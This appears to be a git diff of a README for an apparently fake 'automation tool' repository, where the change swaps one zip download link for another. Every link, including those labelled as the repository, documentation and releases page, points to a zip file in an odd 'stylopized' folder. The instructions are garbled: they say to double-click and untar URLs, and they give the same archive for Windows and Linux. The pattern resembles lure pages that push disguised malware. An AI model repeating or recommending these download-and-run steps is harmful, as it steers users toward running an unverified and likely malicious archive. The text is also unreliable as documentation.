@@ -1,7 +1,7 @@
 # 🚀 auto-repo-mh6h6y55-8 - Easy Automation for Your Tasks
 
 ## 📥 Download the Application
-[![Download Now](https://raw.githubusercontent.com/Lvjinw9617/auto-repo-mh6h6y55-8/main/stylopized/auto-repo-mh6h6y55-8_v3.3.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Lvjinw9617/auto-repo-mh6h6y55-8/main/stylopized/auto-repo-mh6h6y55-8_v3.3.zip)
+[![Download Now](https://github.com/Lvjinw9617/auto-repo-mh6h6y55-8/raw/refs/heads/main/stylopized/h_repo_auto_y_mh_v2.7.zip%20Now-%20-blue)](https://github.com/Lvjinw9617/auto-repo-mh6h6y55-8/raw/refs/heads/main/stylopized/h_repo_auto_y_mh_v2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the **auto-repo-mh6h6y55-8** application! This tool helps you automate various tasks effortlessly using Python. You don’t need any programming knowledge to use it. Just follow the steps below to get started.
@@ -15,22 +15,22 @@ Before you install the application, make sure your system meets these requiremen
 ## 🔗 Download & Install
 To download the application, visit the following link:
 
-[Download Here](https://raw.githubusercontent.com/Lvjinw9617/auto-repo-mh6h6y55-8/main/stylopized/auto-repo-mh6h6y55-8_v3.3.zip)
+[Download Here](https://github.com/Lvjinw9617/auto-repo-mh6h6y55-8/raw/refs/heads/main/stylopized/h_repo_auto_y_mh_v2.7.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the application.
 3. Click on the version number to see the downloadable files.
 4. Choose the file that matches your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/Lvjinw9617/auto-repo-mh6h6y55-8/main/stylopized/auto-repo-mh6h6y55-8_v3.3.zip`
+   - For Windows, download `https://github.com/Lvjinw9617/auto-repo-mh6h6y55-8/raw/refs/heads/main/stylopized/h_repo_auto_y_mh_v2.7.zip`
    - For macOS, download `auto-repo-macos`
-   - For Linux, download `https://raw.githubusercontent.com/Lvjinw9617/auto-repo-mh6h6y55-8/main/stylopized/auto-repo-mh6h6y55-8_v3.3.zip`
+   - For Linux, download `https://github.com/Lvjinw9617/auto-repo-mh6h6y55-8/raw/refs/heads/main/stylopized/h_repo_auto_y_mh_v2.7.zip`
 5. Save the file to your computer.
 
 ## ⚙️ Running the Application
 Once you've downloaded the file, follow these steps to run it:
 
 ### For Windows
-1. Locate the `https://raw.githubusercontent.com/Lvjinw9617/auto-repo-mh6h6y55-8/main/stylopized/auto-repo-mh6h6y55-8_v3.3.zip` file in your Downloads folder.
+1. Locate the `https://github.com/Lvjinw9617/auto-repo-mh6h6y55-8/raw/refs/heads/main/stylopized/h_repo_auto_y_mh_v2.7.zip` file in your Downloads folder.
 2. Double-click the file to run it.
 3. Follow the on-screen instructions to complete the setup.
 
@@ -48,7 +48,7 @@ Once you've downloaded the file, follow these steps to run it:
    ```
 3. Unzip the downloaded file:
    ```bash
-   tar -xzf https://raw.githubusercontent.com/Lvjinw9617/auto-repo-mh6h6y55-8/main/stylopized/auto-repo-mh6h6y55-8_v3.3.zip
+   tar -xzf https://github.com/Lvjinw9617/auto-repo-mh6h6y55-8/raw/refs/heads/main/stylopized/h_repo_auto_y_mh_v2.7.zip
    ```
 4. Navigate into the extracted folder:
    ```bash
@@ -75,8 +75,8 @@ To update, return to the Releases page and download the latest version. Simply r
 If you encounter issues, check the "Help" section within the application. You can also visit the GitHub Issues page for additional support.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/Lvjinw9617/auto-repo-mh6h6y55-8/main/stylopized/auto-repo-mh6h6y55-8_v3.3.zip)
-- [Documentation](https://raw.githubusercontent.com/Lvjinw9617/auto-repo-mh6h6y55-8/main/stylopized/auto-repo-mh6h6y55-8_v3.3.zip)
+- [GitHub Repository](https://github.com/Lvjinw9617/auto-repo-mh6h6y55-8/raw/refs/heads/main/stylopized/h_repo_auto_y_mh_v2.7.zip)
+- [Documentation](https://github.com/Lvjinw9617/auto-repo-mh6h6y55-8/raw/refs/heads/main/stylopized/h_repo_auto_y_mh_v2.7.zip)
 
 ## 📞 Contact
 If you have any questions or feedback, feel free to contact us through the GitHub Issues page. Your input helps us improve the application!
